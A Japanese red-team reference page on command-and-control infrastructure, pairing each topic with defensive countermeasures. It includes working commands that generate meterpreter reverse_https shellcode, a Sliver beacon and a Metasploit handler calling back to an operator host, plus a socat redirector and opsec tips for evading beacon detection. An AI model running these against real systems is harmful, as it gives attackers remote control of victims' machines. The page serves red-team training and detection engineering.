Command & Control

初期アクセス後の指揮統制。設計(リスナー/リダイレクタ/egress)、ペイロード生成、運用時の痕跡と検知までを、公開フレームワーク前提で扱う。実装の武器化ではなく構成と観測点に主眼を置く。 前提: 検証環境。フレームワークは Metasploit / Sliver を想定。丸ごと動く回避チェーンは載せない。

01設計architecture

C2 は「オペレータ ← リダイレクタ ← ビーコン」の三層で考える。オペレータのチームサーバを直接晒さず、前段にリダイレクタ(HTTP/S・DNS)を置いて到達性と匿名性を分離する。検知面はビーコンの周期性・JA3・証明書・DNS 量に現れるため、設計段階で「何が観測されるか」を先に決める。

層役割観測される痕跡
ビーコン被害ホスト上のインプラント周期通信・親子プロセス・メモリ特徴
リダイレクタ前段プロキシ(HTTPS/DNS)証明書・JA3/JA3S・ドメイン評価
チームサーバオペレータ側の制御(直接晒さない)
防御 / countermeasures
  • ビーコンの周期性(jitter を除いた規則性)と長寿命セッションをネットワークで検知。
  • 新規・低評価ドメインへの外向き TLS、異常な JA3/JA3S を相関。

02ペイロード生成payloads

配送形態(exe / dll / shellcode / スクリプト)は実行文脈と検知面のトレードオフで選ぶ。ディスク実行は静的面、インメモリは動的面が増える(Evasion 巻参照)。ここでは公開ツールの用途整理に留める。

bash
# 生シェルコード（検証用・段階的にテスト）
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=$LHOST LPORT=443 -f raw -o beacon.bin

# PE/.NET/スクリプトを position-independent 化
donut -i input.exe -o loader.bin
tipsLHOST は tun0 依存で毎回変わる: $(ip a show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
防御 / countermeasures
  • 既知フレームワークの既定スタブ・エクスポート・文字列を静的シグネチャで検知。
  • ASR ルールと WDAC でスクリプト系ステージャ・未署名バイナリの実行を抑止。

03リスナーlisteners

HTTPS を既定にし、証明書とプロファイル(User-Agent・URI・ヘッダ)を正規トラフィックに寄せる。DNS ビーコンは egress が絞られた環境の代替。

bash
# Sliver: HTTPS リスナー + ビーコン生成
sliver > https --lport 443
sliver > generate beacon --http $C2_HOST --os windows --arch amd64 \
  --jitter 30 --seconds 60

# Metasploit: reverse_https ハンドラ
msfconsole -qx "use exploit/multi/handler; \
  set payload windows/x64/meterpreter/reverse_https; \
  set LHOST $LHOST; set LPORT 443; run"
防御 / countermeasures
  • 既定 C2 プロファイル(既知 URI・User-Agent・自己署名証明書)をIDS/プロキシで検知。
  • 内部→外部 443 のうち、TLS フィンガープリントが一般ブラウザと乖離するものを監視。

04egress / リダイレクタ到達性の分離

チームサーバを直接晒さないため、前段にリダイレクタを置く。HTTP/S は socat / nginx、DNS は権威委任で構成する。ドメイン評価とカテゴリが検知の分かれ目になる。

bash
# 単純な TCP リダイレクタ（検証）
socat TCP4-LISTEN:443,fork,reuseaddr TCP4:$TEAMSERVER:443
注意ドメインフロンティングは多くの CDN で対策済み。成立可否は環境依存で、恒常的手段として当てにしない。
防御 / countermeasures
  • SNI とホストヘッダの不一致、CDN 経由の異常な宛先を検知。
  • DNS の異常(高頻度 TXT/NULL、長いサブドメイン、エントロピー高)を監視。

05運用と痕跡opsec

  • 周期性を崩す — jitter を入れ、規則的ビーコンの検知を避ける。
  • プロセス系譜 — office→cmd→powershell のような不自然な親子連鎖を作らない。
  • 最小限の常駐 — 不要な永続化・多重セッションは痕跡と検知面を増やす。
要点 / key takeaways
  • C2 は三層(ビーコン/リダイレクタ/チームサーバ)で設計し、晒す面を最小化する。
  • 検知はビーコンの周期性・TLS フィンガープリント・DNS 量に出る。設計段階で観測点を決める。
  • 既定プロファイルはそのまま署名対象。URI・UA・証明書を正規化しないと即バレる。
  • ドメインフロンティングは環境依存で恒久策にならない。egress 監視が防御側の要。
